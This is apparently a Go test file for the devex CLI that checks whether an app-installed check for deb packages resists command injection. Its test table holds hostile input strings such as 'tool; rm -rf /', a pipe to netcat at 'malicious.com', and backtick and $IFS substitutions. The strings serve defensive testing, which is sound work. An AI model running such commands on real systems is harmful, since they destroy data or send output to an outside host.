package utilities_test

import (
	. "github.com/onsi/ginkgo/v2"
	. "github.com/onsi/gomega"

	"github.com/jameswlane/devex/apps/cli/internal/installers/utilities"
	"github.com/jameswlane/devex/apps/cli/internal/mocks"
	"github.com/jameswlane/devex/apps/cli/internal/types"
	"github.com/jameswlane/devex/apps/cli/internal/utils"
)

var _ = Describe("IsDebInstalled Security Tests", func() {
	var (
		mockExec     *mocks.MockCommandExecutor
		originalExec utils.Interface
	)

	BeforeEach(func() {
		mockExec = &mocks.MockCommandExecutor{
			FailingCommands: make(map[string]bool),
			Commands:        []string{},
		}
		originalExec = utils.CommandExec
		utils.CommandExec = mockExec
	})

	AfterEach(func() {
		utils.CommandExec = originalExec
	})

	Context("Command Injection Prevention", func() {
		DescribeTable("dangerous command patterns",
			func(command string, description string) {
				// Make "which" command fail to trigger fallback behavior
				mockExec.FailingCommands["which "+command] = true

				appConfig := types.AppConfig{
					BaseConfig: types.BaseConfig{
						Name: "test-app",
					},
					InstallMethod:  "deb",
					InstallCommand: command,
				}

				// Function should complete without security issues
				result, err := utilities.IsAppInstalled(appConfig)
				Expect(err).ToNot(HaveOccurred())

				// Result may vary, but function should complete safely
				_ = result
			},
			Entry("command with semicolon", "tool; rm -rf /", "Commands with semicolons should be handled safely"),
			Entry("command with pipe", "tool | nc malicious.com", "Commands with pipes should be handled safely"),
			Entry("command with backticks", "tool`id`", "Commands with backticks should be handled safely"),
			Entry("command with dollar signs", "tool$IFS$9", "Commands with dollar signs should be handled safely"),
			Entry("command with parentheses", "tool(malicious)", "Commands with parentheses should be handled safely"),
			Entry("command with brackets", "tool[0]", "Commands with brackets should be handled safely"),
			Entry("command with braces", "tool{test}", "Commands with braces should be handled safely"),
			Entry("command with asterisk", "tool*", "Commands with asterisk should be handled safely"),
			Entry("command with question mark", "tool?", "Commands with question mark should be handled safely"),
		)

		It("should handle safe commands normally", func() {
			command := "fastfetch"
			// Allow safe command to be found in PATH
			// mockExec will return success by default for "which fastfetch"

			appConfig := types.AppConfig{
				BaseConfig: types.BaseConfig{
					Name: "test-app",
				},
				InstallMethod:  "deb",
				InstallCommand: command,
			}

			result, err := utilities.IsAppInstalled(appConfig)
			Expect(err).ToNot(HaveOccurred())
			Expect(result).To(BeTrue()) // Should find safe command
		})
	})

	Context("Fallback Execution Safety", func() {
		It("should use safe flags in fallback execution", func() {
			command := "test-tool"

			// Force fallback by making "which" fail
			mockExec.FailingCommands["which "+command] = true

			appConfig := types.AppConfig{
				BaseConfig: types.BaseConfig{
					Name: "test-app",
				},
				InstallMethod:  "deb",
				InstallCommand: command,
			}

			_, err := utilities.IsAppInstalled(appConfig)
			Expect(err).ToNot(HaveOccurred())

			// Verify no bare command execution occurred
			for _, cmd := range mockExec.Commands {
				// This would be the dangerous pattern we fixed
				Expect(cmd).ToNot(Equal(command), "Bare command execution should not occur")

				// Safe fallback should include safety flags
				if cmd == command+" --version 2>/dev/null || "+command+" --help 2>/dev/null || false" {
					// This is the safe pattern we expect - test passes if we see this pattern
					Expect(true).To(BeTrue(), "Found safe fallback pattern")
				}
			}
		})
	})

	Context("Input Validation", func() {
		DescribeTable("edge case inputs",
			func(command string, description string) {
				appConfig := types.AppConfig{
					BaseConfig: types.BaseConfig{
						Name: "test-app",
					},
					InstallMethod:  "deb",
					InstallCommand: command,
				}

				// Should handle gracefully without errors
				result, err := utilities.IsAppInstalled(appConfig)
				Expect(err).ToNot(HaveOccurred())
				_ = result // Result may be false for invalid commands, which is acceptable
			},
			Entry("empty command", "", "Empty commands should be handled gracefully"),
			Entry("whitespace only", "   ", "Whitespace-only commands should be handled gracefully"),
			Entry("very long command", "verylongcommandnamethatcouldpotentiallycauseissuesormightbeusedinattacks", "Very long commands should be handled gracefully"),
		)
	})

	Context("Security Regression Prevention", func() {
		It("should not execute bare commands without safety measures", func() {
			command := "potentially-malicious-tool"

			// Track all executed commands
			var executedCommands []string

			// Override mock to capture all commands
			mockExec.Commands = []string{}
			mockExec.FailingCommands["which "+command] = true

			appConfig := types.AppConfig{
				BaseConfig: types.BaseConfig{
					Name: "test-app",
				},
				InstallMethod:  "deb",
				InstallCommand: command,
			}

			_, err := utilities.IsAppInstalled(appConfig)
			Expect(err).ToNot(HaveOccurred())

			executedCommands = mockExec.Commands

			// Verify that no bare command execution occurred (the security issue we fixed)
			for _, cmd := range executedCommands {
				Expect(cmd).ToNot(Equal(command), "Bare command execution is a security vulnerability")
			}
		})
	})
})
